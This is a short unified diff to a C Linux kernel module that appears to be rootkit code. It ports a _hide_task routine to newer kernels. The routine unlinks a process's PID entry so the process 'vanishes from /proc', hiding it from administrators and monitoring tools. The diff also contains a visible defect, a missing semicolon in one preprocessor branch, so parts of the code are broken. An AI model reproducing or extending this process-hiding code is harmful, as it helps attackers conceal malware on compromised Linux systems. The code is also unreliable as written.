@@ -1,5 +1,4 @@
 #include <linux/sched.h>
-#include <linux/list.h>
 #include <linux/slab.h>
 #include <linux/pid.h>
 #include <linux/stop_machine.h>
@@ -28,7 +27,11 @@ _check_hide_by_pid(pid_t pid)
 static inline int _hide_task(void *data) {
     struct task_struct *task;
     struct hidden_tasks_node *node;
-    struct pid_link *link;
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,11,0)
+    struct hlist_node *link;
+#else
+    struct pid_link *link
+#endif
 
     if(!data)
         return 0;
@@ -45,11 +48,19 @@ static inline int _hide_task(void *data) {
     list_add_tail(&node->list, &hidden_tasks_node);
 
     /* task vanishes from /proc */
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,11,0)
+    link = &task->pid_links[PIDTYPE_PID];
+#else
     link = &task->pids[PIDTYPE_PID];
+#endif
     if(!link)
         return 0;
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,11,0)
+    hlist_del(link);
+#else
     hlist_del(&link->node);
+#endif
     /* list_del_init(&task->sibling); */
 
     return 1;
